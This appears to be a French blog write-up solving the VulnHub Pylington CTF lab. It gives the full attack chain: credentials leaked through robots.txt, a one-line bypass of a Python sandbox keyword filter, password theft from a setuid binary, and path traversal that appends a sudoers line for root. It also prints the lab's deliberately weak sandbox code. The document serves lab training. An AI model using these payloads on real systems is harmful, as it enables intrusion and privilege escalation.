# Solution du CTF Pylington de VulnHub

Marmelade
---------

[Pylington](https://www.vulnhub.com/entry/pylington-1,684/ "Pylington") ressemblait beaucoup à un CTF que j'ai déjà croisé et où il y avait aussi de l'exécution de code Python.  

Ici nous aurons aussi l'occasion de nous pencher sur deux binaires setuid.

```plain

Nmap scan report for 192.168.56.21
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.5 (protocol 2.0)
| ssh-hostkey: 
|   3072 bf:ba:23:4e:69:37:69:9f:23:ae:21:35:98:4d:39:fa (RSA)
|   256 ed:95:53:52:ef:70:1f:c0:0e:3c:d8:be:35:fc:3a:93 (ECDSA)
|_  256 2d:b8:b0:88:52:83:7b:00:47:31:a4:76:2b:3d:7d:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)
| http-robots.txt: 3 disallowed entries 
|_/register /login /zbir7mn240soxhicso2z
|_http-generator: Jekyll v4.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Pylington Cloud | The best way to run Python.
|_http-server-header: Apache/2.4.46 (Unix) mod_wsgi/4.7.1 Python/3.9

```

On attaque bien sûr directement sur le port 80 qui semble héberger une appli web.  

L'entête HTTP mentionne mod\_wsgi et Python, on peut donc imaginer qu'un framework quelconque est utilisé.

Le site a un lien pour créer un compte mais un message indique que les créations sont bloquées.  

Il nous reste le formulaire de login qui nécessite de résoudre un captcha mathématique.

On remarque assez vite que si on ignore le captcha on obtient l'erreur  

> CAPTCHA incorrect!

alors que si le captcha est correct on obtient  

> Username incorrect!

On pourrait sans doute brute forcer le nom d'utilisateur jusqu'à en trouver un valide mais penchons nous d'abord sur le page [/zbir7mn240soxhicso2z/](file:///zbir7mn240soxhicso2z "/zbir7mn240soxhicso2z/") mentionnée dans le fichier *robots.txt*.  

Là on trouve les identifiants suivants :

```plain

Username: steve
Password: bvbkukHAeVxtjjVH

```

Ils sont valides pour la page de login et nous amènent sur un formulaire permettant d'exécuter du Python.  

Il y a deux champs de type textarea, un pour saisir le code, l'autre pour saisir l'input qui sera passé au programme.  

Bien sûr certains mots clés sont bloqués et on obtient par exemple un message si on tente d'importer un module quelconque.  

Si j'avais été plus attentif, j'aurais remarqué que le code chargé du filtrage était donné en lien mais je n'en ai pas eu besoin, le bypass étant trivial :

```python

exec("FROM OS IMPORT SYSTEM AS E".lower())
e("ls -al")

```

Confiture de cerise
-------------------

Une fois le [ReverseSSH](https://github.com/Fahrj/reverse-ssh "ReverseSSH") mis en place je peux fouiller ce qui se passe sur le système. Il y a par exemple un serveur Redis en place :

```plain
redis        188  0.3  0.9  58020  9616 ?        Ssl  20:46   0:04 /usr/bin/redis-server 127.0.0.1:6379
```

Mais il ne semble lié qu'aux captchas de la page de login :

```plain

$ redis-cli
127.0.0.1:6379> INFO keyspace
# Keyspace
db0:keys=1,expires=0,avg_ttl=0
127.0.0.1:6379> keys *
1) "captcha-table"
127.0.0.1:6379> type "captcha-table"
hash
127.0.0.1:6379> hgetall "captcha-table"
1) "36baf60cb7bdf33226062c90fb59e77445b6fb54310dd4fb366ba830e89366d1"
2) "-18"
3) "657f170ad84beffcfc63447eaefc9a6843b2c36fe4e1646e555fb6926f2da611"
4) "-96"
5) "1728f212b663b94df96288e1e43729a25ac9617a454172ca1aedc936ee44d4e2"
6) "71"
7) "0358124fb65d5709467ed31f4d5ef1b02eed454bb559f91cd8bba108dc96aba1"
8) "29"

```

En revanche il y a un utilisateur nommé *py* qui semble être notre prochaine victime :

```plain

[http@archlinux /]$ ls /home/py/ -al
total 56
dr-xr-xr-x 3 py   py    4096 Apr 16  2021 .
drwxr-xr-x 3 root root  4096 Apr  7  2021 ..
-rw------- 1 py   py      21 Dec 20  2020 .bash_logout
-rw------- 1 py   py      57 Dec 20  2020 .bash_profile
-rw------- 1 py   py     141 Dec 20  2020 .bashrc
-r-------- 1 py   py      11 Apr  9  2021 password.txt
drwx------ 2 py   py    4096 Apr  9  2021 secret_stuff
-r-sr-xr-x 1 py   py   19216 Apr  9  2021 typing
-r--r--r-- 1 py   py     689 Apr  9  2021 typing.cc
-r-------- 1 py   py      34 Apr  9  2021 user.txt

```

Il dispose d'un binaire setuid dont la source est disponible :

```c

[http@archlinux /]$ cat /home/py/typing.cc 
#include <iostream>
#include <string>
#include <iterator>
#include <fstream>
#include <algorithm>

int main(){
	std::cout<<"Let's play a game! If you can type the sentence below, then I'll tell you my password.\n\n";

	std::string text="the quick brown fox jumps over the lazy dog";

	std::cout<<text<<'\n';

	std::string line;
	std::getline(std::cin,line);

	if(line==text){
		std::ifstream password_file("/home/py/password.txt");
		std::istreambuf_iterator<char> buf_it(password_file),buf_end;
		std::ostreambuf_iterator<char> out_it (std::cout);
		std::copy(buf_it,buf_end,out_it);
	}
	else{
		std::cout<<"WRONG!!!\n";
	}
}

```

Ca semble trop simple, on se demande où pourrait être le piège surtout qu'un coup de strings sur le fichier retourne la même chaine.  

Je copie colle juste le texte.

```plain

[http@archlinux /]$ /home/py/typing 
Let's play a game! If you can type the sentence below, then I'll tell you my password.

the quick brown fox jumps over the lazy dog
the quick brown fox jumps over the lazy dog
54ezhCGaJV
[http@archlinux /]$ su py
Password: 
[py@archlinux /]$ id
uid=1000(py) gid=1000(py) groups=1000(py)

```

Okayyyyyyyyyyy ! Aucune difficulté donc.

```plain

[py@archlinux ~]$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee

```

Miel
----

On trouve un second binaire setuid mais cette fois pour root :

```plain

[py@archlinux ~]$ ls secret_stuff/ -l
total 32
-rwsr-xr-x 1 root root 26128 Apr  9  2021 backup
-rw-r--r-- 1 root root   586 Apr  9  2021 backup.cc

```

```c

[py@archlinux secret_stuff]$ cat backup.cc 
#include <iostream>
#include <string>
#include <fstream>

int main(){
	std::cout<<"Enter a line of text to back up: ";
	std::string line;
	std::getline(std::cin,line);
	std::string path;
	std::cout<<"Enter a file to append the text to (must be inside the /srv/backups directory): ";
	std::getline(std::cin,path);

	if(!path.starts_with("/srv/backups/")){
		std::cout<<"The file must be inside the /srv/backups directory!\n";
	}
	else{
		std::ofstream backup_file(path,std::ios_base::app);
		backup_file<<line<<'\n';
	}

	return 0;
}

```

L'exécutable semble demander une ligne et un nom de fichier puis rajoute la ligne à la fin du fichier.  

Le path saisit doit commencer par /srv/backups/ et grace à un fichier présent on peut vérifier le comportement du programme.

```plain

[py@archlinux secret_stuff]$ cat /srv/backups/ree 
hello reeehello hello
goodbye
[py@archlinux secret_stuff]$ ./backup 
Enter a line of text to back up: mytest
Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/ree
[py@archlinux secret_stuff]$ cat /srv/backups/ree
hello reeehello hello
goodbye
mytest

```

Il y a plein de méthodes sous Linux pour obtenir une escalade de privilège via l'ajout de lignes dans un fichier (/etc/passwd, crontab, etc), j'ai opté pour le fichier *sudoers*.

```plain

[py@archlinux secret_stuff]$ ./backup 
Enter a line of text to back up: py ALL=(ALL) ALL
Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/../../etc/sudoers
[py@archlinux secret_stuff]$ sudo su
[sudo] password for py: 
sudo: su: command not found
[py@archlinux secret_stuff]$ export PATH=/usr/local/bin:/usr/bin:/bin:/sbin:/usr/sbin
[py@archlinux secret_stuff]$ sudo su
[root@archlinux secret_stuff]# cd /root
[root@archlinux ~]# ls
root.txt
[root@archlinux ~]# cat root.txt
63a9f0ea7bb98050796b649e85481845

```

Sous le chapeau
---------------

Dans le fichier [/srv/wsgi/shell.py](file:///srv/wsgi/shell.py "/srv/wsgi/shell.py") on retrouve le code chargé de l'exécution Python, voici un extrait :

```python

def check_if_safe(code: str) -> bool:
	if 'import' in code: # import is too dangerous
		return False
	elif 'os' in code: # os is too dangerous
		return False
	elif 'open' in code: # opening files is also too dangerous
		return False
	else:
		return True

def run_program(raw_form_data) -> (str,str):
	program=""
	stdin=""

	try:
		program=raw_form_data["program"][0]
		stdin=raw_form_data["stdin"][0]
	except KeyError:
		pass

	if check_if_safe(program):
		code_dir="/tmp/"+secrets.token_hex(16)+"/"
		os.mkdir(code_dir)
		program_file=code_dir+"program.py"
		stdin_file=code_dir+"stdin"
		output_file=code_dir+"output"
		try:
			with open(program_file,'w') as pf:
				pf.write(program)
			with open(stdin_file,'w') as sf:
				sf.write(stdin)
			os.system(f"python {program_file} < {stdin_file} > {output_file} 2>&1")
			with open(output_file,'r') as of:
				return (program,of.read())
		except Exception as e:
			return (program,str(e))

	else:
		return (program,"H4CK3R AL3R7!!! Malicious program detected by the sandbox")

def wsgi_app(environ, start_response):
	status = '200 OK'

	program=""
	program_output=""

	if environ['REQUEST_METHOD'] == 'POST':
		raw_form_data=parse_qs(environ['wsgi.input'].read().decode())
		program,program_output=run_program(raw_form_data)

	page=bytes(content1+program+content2+program_output+content3,"utf8")
	headers = [('Content-type', 'text/html'),
			   ('Content-Length', str(len(page)))]
	start_response(status, headers)
	return [page]

application = wsgi_app

```

Un challenge simple mais bien réalisé où l'on ne cherche pas à savoir quoi faire mais comment le faire. C'est ce qui fait toute la différence entre le mauvais et le bon CTF.



*Published January 10 2022 at 08:35*